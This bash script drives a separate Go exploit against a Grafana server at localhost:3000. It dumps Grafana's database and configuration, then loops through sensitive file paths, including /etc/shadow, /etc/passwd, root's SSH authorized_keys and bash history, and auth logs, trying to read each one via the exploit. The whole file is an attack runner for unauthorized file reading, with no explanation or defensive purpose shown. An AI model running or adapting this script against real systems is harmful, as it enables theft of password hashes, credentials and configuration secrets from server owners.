#!/bin/bash

SCRIPT_DIR=$(dirname "$(realpath "$0")")

# Define the target and output paths
target="http://localhost:3000"

# Check if Go is installed correctly
if ! command -v go &> /dev/null
then
    echo "Go could not be installed. Exiting."
    exit 1
fi

# Run the exploit to dump the database to grafana.db
echo "Running exploit to dump the database to grafana.db..."
/snap/bin/go run $SCRIPT_DIR/exploit.go -target $target -dump-database -output grafana.db

# Run the exploit to dump the configuration to defaults.ini
echo "Running exploit to dump the configuration to defaults.ini..."
/snap/bin/go run $SCRIPT_DIR/exploit.go -target $target -dump-config -output defaults.ini


# List of sensitive file paths to attempt to access
sensitive_paths=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/hosts"
    "/etc/hostname"
    "/etc/group"
    "/root/.bash_history"
    "/root/.ssh/authorized_keys"
    "/var/log/syslog"
    "/var/log/auth.log"
    "/var/www/html/config.php"
)

# Attempt to access each sensitive file
for file_path in "${sensitive_paths[@]}"; do
    echo "Running exploit to retrieve $target..."
    /snap/bin/go run $SCRIPT_DIR/exploit.go -target $target -file "$file_path"
done